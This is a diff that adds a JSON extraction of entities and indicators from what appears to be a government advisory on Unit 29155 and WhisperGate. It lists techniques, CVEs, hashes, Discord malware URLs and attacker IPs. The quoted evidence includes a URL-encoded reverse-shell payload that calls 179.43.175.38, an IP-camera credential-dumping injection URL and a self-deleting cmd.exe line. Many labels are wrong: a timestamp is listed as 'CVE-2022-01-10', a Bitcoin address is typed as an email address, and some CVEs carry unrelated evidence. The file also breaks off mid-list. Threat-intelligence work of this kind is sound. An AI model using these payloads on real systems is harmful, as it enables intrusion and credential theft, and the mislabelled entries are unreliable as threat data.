@@ -1,0 +1,1612 @@
+{
+ "entities": [
+  {
+   "type": "intrusion-set",
+   "name": "Unit 29155",
+   "evidence": "Unit 29155 cyber actors were not observed using these tools outside of their intended purpose."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "T1595.001",
+   "evidence": "s [T1595.001] used within multiple government and critical infrastructure organizations."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "T1595.002",
+   "evidence": "Acunetix: Unit 29155 cyber actors leveraged both Acunetix and Nmap to identify open ports, services, and vulnerabilities for networks [T1595.002]."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "T1590.002",
+   "evidence": "Amass: Unit 29155 cyber actors leveraged both Amass and VirusTotal to obtain subdomains for target websites [T1590.002]."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "T1046",
+   "evidence": "Nmap: Once Unit 29155 cyber actors gained access to victim internal networks, they further used Nmap (via the Nmap Scripting Engine [NSE]) to write custom scripts for discovering and scanning other machines [T1046]."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "T1596.005",
+   "evidence": "Shodan: Unit 29155 cyber actors used Shodan to identify hosts with a specific set of vulnerabilities or device types [T1596.005]."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "T1588.005",
+   "evidence": "Unit 29155 cyber actors have been observed obtaining the respective exploit scripts for, but not exploiting, the following CVEs: ... [T1588.005]."
+  },
+  {
+   "type": "vulnerability",
+   "name": "CVE-2020-1472",
+   "evidence": "Unit 29155 cyber actors have used infrastructure configured with OpenVPN configuration [T1572] over port 1194, and in some instances, to perform Active Directory (AD) enumeration."
+  },
+  {
+   "type": "vulnerability",
+   "name": "CVE-2021-26084",
+   "evidence": "Unit 29155 cyber actors have used infrastructure configured with OpenVPN configuration [T1572] over port 1194, and in some instances, to perform Active Directory (AD) enumeration."
+  },
+  {
+   "type": "vulnerability",
+   "name": "CVE-2021-3156",
+   "evidence": "Unit 29155 cyber actors have used infrastructure configured with OpenVPN configuration [T1572] over port 1194, and in some instances, to perform Active Directory (AD) enumeration."
+  },
+  {
+   "type": "vulnerability",
+   "name": "CVE-2021-4034",
+   "evidence": "Unit 29155 cyber actors have used infrastructure configured with OpenVPN configuration [T1572] over port 1194, and in some instances, to perform Active Directory (AD) enumeration."
+  },
+  {
+   "type": "vulnerability",
+   "name": "CVE-2022-27666",
+   "evidence": "Unit 29155 cyber actors have used infrastructure configured with OpenVPN configuration [T1572] over port 1194, and in some instances, to perform Active Directory (AD) enumeration."
+  },
+  {
+   "type": "vulnerability",
+   "name": "CVE-2021-33044",
+   "evidence": "Analysis concluded Unit 29155 cyber actors have exploited the following CVEs for initial access [T1190], as detailed throughout this advisory: ... [CVE-2021-33044]."
+  },
+  {
+   "type": "vulnerability",
+   "name": "CVE-2021-33045",
+   "evidence": "Analysis concluded Unit 29155 cyber actors have exploited the following CVEs for initial access [T1190], as detailed throughout this advisory: ... [CVE-2021-33045]."
+  },
+  {
+   "type": "vulnerability",
+   "name": "CVE-2022-26134",
+   "evidence": "Analysis concluded Unit 29155 cyber actors have exploited the following CVEs for initial access [T1190], as detailed throughout this advisory: ... [CVE-2022-26134]."
+  },
+  {
+   "type": "vulnerability",
+   "name": "CVE-2022-26138",
+   "evidence": "Analysis concluded Unit 29155 cyber actors have exploited the following CVEs for initial access [T1190], as detailed throughout this advisory: ... [CVE-2022-26138]."
+  },
+  {
+   "type": "vulnerability",
+   "name": "CVE-2022-3236",
+   "evidence": "Analysis concluded Unit 29155 cyber actors have exploited the following CVEs for initial access [T1190], as detailed throughout this advisory: ... [CVE-2022-3236]."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "T1190",
+   "evidence": "Analysis concluded Unit 29155 cyber actors have exploited the following CVEs for initial access [T1190], as detailed throughout this advisory: ..."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "T1078.001",
+   "evidence": "Unit 29155 cyber actors have used Shodan to scan for Internet of Things (IoT) devices, using exploitation scripts to authenticate to IP cameras with default usernames and passwords [T1078.001]."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "T1125",
+   "evidence": "Unit 29155 cyber actors have used Shodan to scan for Internet of Things (IoT) devices, using exploitation scripts to authenticate to IP cameras with default usernames and passwords [T1078.001], and exfiltrating images [T1125]."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "T1552.001",
+   "evidence": "Unit 29155 cyber actors have used Shodan to scan for Internet of Things (IoT) devices, using exploitation scripts to authenticate to IP cameras with default usernames and passwords [T1078.001], and exfiltrating images [T1125] (JPG files). Attempts are then made to perform remote command execution via web to vulnerable IP cameras; if successful, cyber actors would dump configuration settings and credentials in plaintext (as shown in Table 1 below) [T1552.001]."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "T1003",
+   "evidence": "Web requests observed from victim infrastructure These requests are likely intended to dump configuration settings and credentials [T1003]: hxxp://<IP>:<port>/PictureCatch.cgi?username=<NAME>&password= %3becho%20%22%3c%21--%23include%20file=%22SYS_CFG%22-- %3e%22%3etmp/Login.htm%3b&data_type=1&attachment=1&channel=1& secret=1&key=PWNED"
+  },
+  {
+   "type": "attack-pattern",
+   "name": "T1071.001",
+   "evidence": "POST requests sent to victims with payloads [T1071.001] \"txtUser=lol&txtPassword=2&btConnect=Piesl%C4%93gtiesbtConnect=Piesl%C4%93gties&chRemember=on&txtPassword=g00dPa%24%24w0rD&txtUser=$%7b@print(system(%22bash%20i%20%3E%26%20%2Fdev%2Ftcp%2F179.43.175.38%2F6870%200%3E%261%22))%7d\""
+  },
+  {
+   "type": "attack-pattern",
+   "name": "T1567.002",
+   "evidence": "In one instance shortly following a deployment of WhisperGate malware, Unit 29155 cyber actors exfiltrated data to mega[.]nz using Rclone [T1567.002]."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "T1550.002",
+   "evidence": "Unit 29155 cyber actors used a Pass-the-Hash [T1550.002] via ProxyChains."
+  },
+  {
+   "type": "intrusion-set",
+   "name": "Unit 29155",
+   "evidence": "Unit 29155 cyber actors compressing victim data [T1560] (e.g., the entire filesystem, select file system artifacts or user data, and/or database dumps) to send back to their infrastructure."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Gather Victim Network Information: DNS",
+   "evidence": "Unit 29155 cyber actors have used Amass and VirusTotal to obtain information about victims’ DNS for possible use during targeting, such as subdomains for target websites."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Active Scanning",
+   "evidence": "Unit 29155 cyber actors use publicly available tools to gather information for possible use during targeting."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Active Scanning: Scanning IP Blocks",
+   "evidence": "Unit 29155 cyber actors use various open source scanning tools to scan for victim IP ranges."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Active Scanning: Vulnerability Scanning",
+   "evidence": "Unit 29155 cyber actors use publicly available scanning tools to enable their discovery of IoT devices and exploitable vulnerabilities."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Search Open Technical Databases: Scan Databases",
+   "evidence": "Unit 29155 cyber actors use publicly available platforms like Shodan to identify internet connected hosts."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Acquire Infrastructure: Virtual Private Server",
+   "evidence": "Unit 29155 cyber actors have used VPSs to host their operational tools, perform reconnaissance, exploit victim infrastructure, and exfiltrate victim data."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Obtain Capabilities: Malware",
+   "evidence": "Unit 29155 cyber actors obtain publicly available malware and malware loaders to support their operations. For example, analysis suggests Raspberry Robin malware may have been used in the role of an access broker."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Obtain Capabilities: Exploits",
+   "evidence": "Unit 29155 cyber actors are known to obtain CVE exploit scripts from GitHub repositories and use them against victim infrastructure."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Valid Accounts: Default Accounts",
+   "evidence": "Unit 29155 cyber actors use exploitation scripts to authenticate to IP cameras with default usernames and passwords."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Exploit Public-Facing Application",
+   "evidence": "Unit 29155 cyber actors have used a variety of public exploits, including CVE-2021-33044, CVE-2021-33045, CVE-2022-26134, and CVE-2022-26138."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Command and Scripting Interpreter: PowerShell",
+   "evidence": "Unit 29155 cyber actors have used PowerShell to execute commands and other operational tasks."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Server Software Component: Web Shell",
+   "evidence": "Unit 29155 cyber actors use web shells to establish persistent access to systems."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "OS Credential Dumping: LSASS Memory",
+   "evidence": "Unit 29155 cyber actors have exfiltrated LSASS memory dumps to retrieve credentials from victim machines."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "OS Credential Dumping: Security Account Manager",
+   "evidence": "Unit 29155 cyber actors have exfiltrated usernames and hashed passwords from the SAM."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Brute Force: Password Spraying",
+   "evidence": "Unit 29155 cyber actors targeted victims’ Microsoft OWA infrastructure with password spraying to obtain valid usernames and passwords."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Unsecured Credentials: Credentials in Files",
+   "evidence": "Following exploitation of vulnerable IP cameras, Unit 29155 cyber actors dump configuration settings and credentials in plaintext."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Network Service Discovery",
+   "evidence": "Once Unit 29155 cyber actors gained access to victim internal networks, they further used Nmap (via the NSE) to write custom scripts for discovering and scanning other machines."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Log Enumeration",
+   "evidence": "Unit 29155 cyber actors have enumerated and exfiltrated SECURITY and SYSTEM logs."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Use Alternate Authentication Material: Pass the Hash",
+   "evidence": "Unit 29155 cyber actors used Pass-the-Hash to authenticate via SMB."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Email Collection",
+   "evidence": "Unit 29155 cyber actors have used their infrastructure to compromise multiple victims’ mail servers and exfiltrate mail artifacts, such as email messages."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Video Capture",
+   "evidence": "Unit 29155 cyber actors have exploited IoT devices, specifically IP cameras with default usernames and passwords, and exfiltrated images."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Data from Information Repositories: Confluence",
+   "evidence": "Unit 29155 cyber actors leveraged Through the Wire against the victim’s internet-facing Confluence server."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Archive Collected Data",
+   "evidence": "Unit 29155 cyber actors compress victim data (e.g., the entire filesystem, select file system artifacts or user data, and/or database dumps) to send back to their infrastructure."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Proxy: Multi-hop Proxy",
+   "evidence": "Unit 29155 cyber actors executed commands via ProxyChains—a tool used to route internal traffic through a series of proxies."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Application Layer Protocol: Web Protocols",
+   "evidence": "Unit 29155 cyber actors use POST requests over HTTP to send payloads to victims."
+  },
+  {
+   "type": "intrusion-set",
+   "name": "Unit 29155",
+   "evidence": "Unit 29155 cyber actors executed commands via ProxyChains—a tool used to route internal traffic through a series of proxies."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Proxy: Multi-hop",
+   "evidence": "Proxy: Multi-hop Proxy T1090.003 Unit 29155 cyber actors executed commands via ProxyChains—a tool used to route internal traffic through a series of proxies."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Application Layer Protocol: Web",
+   "evidence": "Application Layer Protocol: Web Protocols T1071.001 Unit 29155 cyber actors use POST requests over HTTP to send payloads to victims."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Application Layer Protocol: DNS",
+   "evidence": "Application Layer Protocol: DNS T1071.004 Unit 29155 cyber actors used DNS tunneling tools, such as dnscat/2 and Iodine, to tunnel IPv4 network traffic."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Non-Application Layer Protocol",
+   "evidence": "Non-Application Layer Protocol T1095 Unit 29155 cyber actors commonly use a reverse TCP connection to initiate communication with their infrastructure."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Ingress Tool Transfer",
+   "evidence": "Ingress Tool Transfer T1105 When an exploit is successfully executed on a victim system, Unit 29155 cyber actors are known to launch the Meterpreter payload to initiate communication with their actor-controlled systems."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Protocol Tunneling",
+   "evidence": "Protocol Tunneling T1572 Unit 29155 cyber actors have used infrastructure configured with OpenVPN configuration to tunnel traffic over a single port (1194), VPNs, and GOST to anonymize their operational activity."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Exfiltration Over Web Service: Exfiltration to Cloud Storage",
+   "evidence": "Exfiltration Over Web Service: Exfiltration to Cloud Storage T1567.002 Unit 29155 cyber actors exfiltrated data to the cloud storage and file hosting service, MEGA (mega[.]nz), using Rclone."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "Data Destruction",
+   "evidence": "Data Destruction T1485 Unit 29155 cyber actors’ objectives include the destruction of data."
+  },
+  {
+   "type": "intrusion-set",
+   "name": "Unit 29155",
+   "evidence": "Named earlier in the document: Unit 29155"
+  },
+  {
+   "type": "malware",
+   "name": "WhisperGate",
+   "evidence": "This technical analysis details the WhisperGate malware deployed against Ukraine"
+  },
+  {
+   "type": "tool",
+   "name": "Discord",
+   "evidence": "Discord is commonly leveraged by threat actors as an endpoint for malware distribution and control"
+  },
+  {
+   "type": "vulnerability",
+   "name": "CVE-2022-26134",
+   "evidence": "Confluence Server and Data Center - CVE-2022-26134"
+  },
+  {
+   "type": "sector",
+   "name": "Energy",
+   "evidence": "The analysis provides insight into Unit 29155 cyber actor infrastructure used for network scanning, password compromising, and data exfiltration against Ukraine, NATO members in Europe and North America, and countries in Latin America and Central Asia."
+  },
+  {
+   "type": "country",
+   "name": "Russia",
+   "evidence": "Russian National Charged for Conspiring with Russian Military Intelligence to Destroy Ukrainian Government Computer Systems and Data"
+  },
+  {
+   "type": "organization",
+   "name": "CERT-UA",
+   "evidence": "SaintBot, as detailed by CERT-UA"
+  },
+  {
+   "type": "malware",
+   "name": "stage2.exe",
+   "evidence": "stage2.exe was obtained from the C:\\ path of the Ukrainian victim’s Windows machine."
+  },
+  {
+   "type": "malware",
+   "name": "asd.exe",
+   "evidence": "asd.exe is likely a development version of stage1.exe."
+  },
+  {
+   "type": "malware",
+   "name": "Tbopbh.jpg",
+   "evidence": "Tbopbh.jpg was downloaded from a Discord URL."
+  },
+  {
+   "type": "malware",
+   "name": "Frkmlkdkdubkznbkmcf.dll",
+   "evidence": "The original filename from the resulting payload was a Dynamic Link Library (DLL) file, Frkmlkdkdubkznbkmcf.dll."
+  },
+  {
+   "type": "tool",
+   "name": "AdvancedRun.exe",
+   "evidence": "AdvancedRun.exe created and executed twice."
+  },
+  {
+   "type": "tool",
+   "name": "InstallUtil.exe",
+   "evidence": "InstallUtil.exe created and executed; files corrupted following execution."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "T1059.001",
+   "evidence": "HTTP GET request sent to Discord URL to download Tbopbh.jpg."
+  },
+  {
+   "type": "vulnerability",
+   "name": "CVE-2022-01-10",
+   "evidence": "TimeDateStamp 2022-01-10 05:37:18."
+  },
+  {
+   "type": "sector",
+   "name": "Energy",
+   "evidence": "Russian Military Cyber Actors Target US and Global Critical Infrastructure."
+  },
+  {
+   "type": "country",
+   "name": "Russia",
+   "evidence": "Russian Military Cyber Actors Target US and Global Critical Infrastructure."
+  },
+  {
+   "type": "organization",
+   "name": "FBI",
+   "evidence": "FBI | CISA | NSA | et. al."
+  },
+  {
+   "type": "organization",
+   "name": "CISA",
+   "evidence": "FBI | CISA | NSA | et. al."
+  },
+  {
+   "type": "organization",
+   "name": "NSA",
+   "evidence": "FBI | CISA | NSA | et. al."
+  },
+  {
+   "type": "organization",
+   "name": "Ukrainian victim",
+   "evidence": "stage2.exe was obtained from the C:\\ path of the Ukrainian victim’s Windows machine."
+  },
+  {
+   "type": "malware",
+   "name": "WhisperKill",
+   "evidence": "Waqybg is known as WhisperKill—a malware downloaded by WhisperGate that destroys files with specific extensions."
+  },
+  {
+   "type": "malware",
+   "name": "WhisperGate",
+   "evidence": "Waqybg is known as WhisperKill—a malware downloaded by WhisperGate that destroys files with specific extensions."
+  },
+  {
+   "type": "malware",
+   "name": "stage2.exe",
+   "evidence": "stage2.exe was observed calling method Ylfwdwgmpilzyaph to begin decrypting resource 78c855a088924e92a7f60d661c3d1845."
+  },
+  {
+   "type": "malware",
+   "name": "Frkmlkdkdubkznbkmcf.dll",
+   "evidence": "The original filename from the resulting payload was a Dynamic Link Library (DLL) file, Frkmlkdkdubkznbkmcf.dll;"
+  },
+  {
+   "type": "malware",
+   "name": "AdvancedRun.exe",
+   "evidence": "Table 23: AdvancedRun (decompressed) Type Win32 EXE Company NirSoft Original File Name AdvancedRun.exe"
+  },
+  {
+   "type": "malware",
+   "name": "Tbopbh.jpg",
+   "evidence": "stage2.exe and its respective payload, Tbopbh.jpg, served as a template for other malware within Discord Cluster 1."
+  },
+  {
+   "type": "malware",
+   "name": "Nmddfrqqrbyjeygggda.vbs",
+   "evidence": "Nmddfrqqrbyjeygggda.vbs wrote to the Windows %TEMP% directory and has the following attributes, as listed in Table 22 below."
+  },
+  {
+   "type": "tool",
+   "name": "EazFuscator",
+   "evidence": "Note: This format annotates action taken by EazFuscator to obfuscate items, making it difficult for malware analysts to review."
+  },
+  {
+   "type": "tool",
+   "name": "WScript.Shell",
+   "evidence": "The VBS code listed in Table 22 used a WScript shell that executed as a Windows application, which ran a PowerShell command to exclude the C:\\ drive from Windows Defender's security checks."
+  },
+  {
+   "type": "tool",
+   "name": "PowerShell",
+   "evidence": "The VBS code listed in Table 22 used a WScript shell that executed as a Windows application, which ran a PowerShell command to exclude the C:\\ drive from Windows Defender's security checks."
+  },
+  {
+   "type": "tool",
+   "name": "MinGW(GCC: (GNU) 6.3.0)",
+   "evidence": "The reversed and decompressed Waqybg files contained file corruption logic along with a final command to ping arbitrarily and delete itself: cmd.exe /min /C ping 111.111.111.111 -n 5 -w 10 > Nul & Del /f /q \"%s\"."
+  },
+  {
+   "type": "tool",
+   "name": "GNU linker Id (GNU Binutils)(2.28)",
+   "evidence": "The reversed and decompressed Waqybg files contained file corruption logic along with a final command to ping arbitrarily and delete itself: cmd.exe /min /C ping 111.111.111.111 -n 5 -w 10 > Nul & Del /f /q \"%s\"."
+  },
+  {
+   "type": "attack-pattern",
+   "name": "File Corruption",
+   "evidence": "The reversed and decompressed Waqybg files contained file corruption logic along with a final command to ping arbitrarily and delete itself: cmd.exe /min /C ping 111.111.111.111 -n 5 -w 10 > Nul & Del /f /q \"%s\"."
+  },
+  {
+   "type": "vulnerability",
+   "name": "CVE-2022-01-10",
+   "evidence": "The original filename from the resulting payload was a Dynamic Link Library (DLL) file, Frkmlkdkdubkznbkmcf.dll; its attributes are listed in Table 21:"
+  },
+  {
+   "type": "sector",
+   "name": "Energy",
+   "evidence": "Russian Military Cyber Actors Target US and Global Critical Infrastructure"
+  },
+  {
+   "type": "sector",
+   "name": "Transport",
+   "evidence": "Russian Military Cyber Actors Target US and Global Critical Infrastructure"
+  },
+  {
+   "type": "sector",
+   "name": "Defense",
+   "evidence": "Russian Military Cyber Actors Target US and Global Critical Infrastructure"
+  },
+  {
+   "type": "sector",
+   "name": "Finance",
+   "evidence": "Russian Military Cyber Actors Target US and Global Critical Infrastructure"
+  },
+  {
+   "type": "sector",
+   "name": "Health",
+   "evidence": "Russian Military Cyber Actors Target US and Global Critical Infrastructure"
+  },
+  {
+   "type": "sector",
+   "name": "Technology",
+   "evidence": "Russian Military Cyber Actors Target US and Global Critical Infrastructure"
+  },
+  {
+   "type": "country",
+   "name": "Russia",
+   "evidence": "Russian Military Cyber Actors Target US and Global Critical Infrastructure"
+  },
+  {
+   "type": "intrusion-set",
+   "name": "Unit 29155",
+   "evidence": "Russian Military Cyber Actors Target US and Global Critical Infrastructure"
+  },
+  {
+   "type": "tool",
+   "name": "ngrok",
+   "evidence": "https://ngrok[.]com (Note: This domain is a legitimate service leveraged for malicious purposes by Unit 29155 cyber actors and should be investigated prior to blocking.)"
+  }
+ ],
+ "observables": [
+  {
+   "type": "domain-name",
+   "value": "mega.nz",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "url",
+   "value": "hxxp://<IP>:<port>/PictureCatch.cgi?username=<NAME>&password= %3becho%20%22%3c%21--%23include%20file=%22SYS_CFG%22-- %3e%22%3etmp/Login.htm%3b&data_type=1&attachment=1&channel=1& secret=1&key=PWNED",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "url",
+   "value": "hxxp://<IP>:<port>/ssi.cgi/tmp/Login.htm",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "url",
+   "value": "hxxp://<IP>:<port>/PictureCatch.cgi?username=<NAME>&password= %3becho%20%22%3c%21--%23include%20file=%22SYS_CFG%22-- %3e%22%3etmp/Login.htm%3b&data_type=1&attachment=1&channel=1& secret=1&key=PWNED",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "url",
+   "value": "hxxp://<IP>:<port>/ssi.cgi/tmp/Login.htm",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "domain-name",
+   "value": "mega[.]nz",
+   "indicates": [
+    "attack-pattern"
+   ]
+  },
+  {
+   "type": "url",
+   "value": "hxxps://cdn.discordapp[.]com/attachments/928503440139771947/930108637681184768/Tbopbh.jpg",
+   "indicates": [
+    "stage2.exe"
+   ]
+  },
+  {
+   "type": "url",
+   "value": "hxxps://cdn.discordapp[.]com/attachments/888408190625128461/895633952247799858/n.lashevychdirekcy.atom.gov.ua.zip",
+   "indicates": [
+    "Cluster 2"
+   ]
+  },
+  {
+   "type": "url",
+   "value": "hxxps://cdn.discordapp[.]com/attachments/945968593030496269/945970446149509130/Client.exe",
+   "indicates": [
+    "Client.exe"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "stage1.exe",
+   "hash": "MD5:5d5c99a08a7d927346ca2dafa7973fc1, SHA-256:a196c6b8ffcb97ffb276d04f354696e2391311db3841ae16c8c9f56f36a38e92",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "test01.exe",
+   "hash": "",
+   "indicates": [
+    "Cluster 2"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "load2022.exe",
+   "hash": "",
+   "indicates": [
+    "Cluster 2"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "8a7d927346ca2dafa7973fc1",
+   "hash": "SHA-256",
+   "indicates": [
+    "malware"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "a196c6b8ffcb97ffb276d04f354696e2391311db3841ae16c8c9f56f36a38e92",
+   "hash": "SHA-256",
+   "indicates": [
+    "malware"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "eac0ae655d344c25ff467a929790885c",
+   "hash": "MD5",
+   "indicates": [
+    "malware"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "b9e64b58d7746cb1d3bed20405ef34d097af08c809d8dad10b9296b0bebb2b0b",
+   "hash": "SHA-256",
+   "indicates": [
+    "malware"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "764f691b2168e8b3b6f9fb6582e2f819",
+   "hash": "MD5",
+   "indicates": [
+    "malware"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "aa79afbf82b06cda268664b7c83900d8f7a33e0f0071facba0b3d8f7a68ce56a",
+   "hash": "SHA-256",
+   "indicates": [
+    "malware"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "14c8482f302b5e81e3fa1b18a509289d",
+   "hash": "MD5",
+   "indicates": [
+    "malware"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "dcbbae5a1c61dbbbb7dcd6dc5dd1eb1169f5329958d38b58c3fd9384081c9b78",
+   "hash": "SHA-256",
+   "indicates": [
+    "malware"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "b3370eb3c5ef6c536195b3bea0120929",
+   "hash": "MD5",
+   "indicates": [
+    "malware"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "923eb77b3c9e11d6c56052318c119c1a22d11ab71675e6b95d05eeb73d1accd6",
+   "hash": "SHA-256",
+   "indicates": [
+    "malware"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "e61518ae9454a563b8f842286bbdb87b",
+   "hash": "MD5",
+   "indicates": [
+    "malware"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "9ef7dbd3da51332a78eff19146d21c82957821e464e8133e9594a07d716d892d",
+   "hash": "SHA-256",
+   "indicates": [
+    "malware"
+   ]
+  },
+  {
+   "type": "url",
+   "value": "hxxp://cdn.discordapp.com/attachments/928503440139771947/930108637681184768/Tbopbh[.]jpg",
+   "indicates": [
+    "malware"
+   ]
+  },
+  {
+   "type": "url",
+   "value": "hxxps://cdn.discordapp.com/attachments/928503440139771947/930108637681184768/Tbopbh.jpg",
+   "indicates": [
+    "malware"
+   ]
+  },
+  {
+   "type": "email-addr",
+   "value": "1AVNM68gj6PGPFcJuftKATa4WLnzg8fpfv",
+   "indicates": [
+    "malware"
+   ]
+  },
+  {
+   "type": "email-addr",
+   "value": "8BEDC411012A33BA34F49130D0F186993C6A32DAD8976F6A5D82C1ED23054C05",
+   "indicates": [
+    "malware"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "Frkmlkdkdubkznbkmcf.dll",
+   "hash": "7c8cb5598e724d34384cce7402b11f0e",
+   "indicates": [
+    "malware"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "Nmddfrqqrbyjeygggda.vbs",
+   "hash": "6eed4ee0cc57126e9a096ab9905f471c",
+   "indicates": [
+    "malware"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "Nmddfrqqrbyjeygggda.vbs",
+   "hash": "db5a204a34969f60fe4a653f51d64eee024dbf018edea334e8b3df780eda846f",
+   "indicates": [
+    "malware"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "AdvancedRun.exe",
+   "hash": "17fc12902f4769af3a9271eb4e2dacce",
+   "indicates": [
+    "malware"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "AdvancedRun.exe",
+   "hash": "29ae7b30ed8394c509c561f6117ea671ec412da50d435099756bbb257fafb10b",
+   "indicates": [
+    "malware"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "Waqybg",
+   "hash": "de85ca91e1e8100a619de1c25112f1a5",
+   "indicates": [
+    "malware"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "Waqybg",
+   "hash": "489ab4819830d231c3fc3572c5386cad9d18773a8121373ea8174de981cc9166",
+   "indicates": [
+    "malware"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "Waqybg",
+   "hash": "9b1191f1ceddf312b0d609cd929c6631",
+   "indicates": [
+    "malware"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "Waqybg",
+   "hash": "0dd61a16c625c49ffefaf4ce24cabf9a074028a06640d9bbb804f735ff56dfa3",
+   "indicates": [
+    "malware"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "Waqybg",
+   "hash": "29d83f29c0b0a0b7499e71e7d5cb713f",
+   "indicates": [
+    "malware"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "Tbopbh.jpg",
+   "hash": "d034fe4c71b16b6d331886c24fef2751",
+   "indicates": [
+    "malware"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "Tbopbh.jpg",
+   "hash": "4074798a621232dc448b65db7b1fdd66",
+   "indicates": [
+    "malware"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "Afgyyppsysmtddhvhhaw.dll",
+   "hash": "d034fe4c71b16b6d331886c24fef2751",
+   "indicates": [
+    "malware"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "Avbbwys.dll",
+   "hash": "422437f326b8dbe30cc5f103bde31f26",
+   "indicates": [
+    "malware"
+   ]
+  },
+  {
+   "type": "file",
+   "value": "Avbbwys.dll",
+   "hash": "7f84263fd24f783ff72d5ae91011b558",
+   "indicates": [
+    "malware"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "5.226.139[.]66",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "45.141.87[.]11",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "46.101.242[.]222",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "62.173.140[.]223",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "79.124.8[.]66",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "90.131.156[.]107",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "112.51.253[.]153",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "112.132.218[.]45",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "154.21.20[.]82",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "179.43.133[.]202",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "179.43.142[.]42",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "179.43.162[.]55",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
+   "type": "ipv4-addr",
+   "value": "179.43.175[.]38",
+   "indicates": [
+    "Unit 29155"
+   ]
+  },
+  {
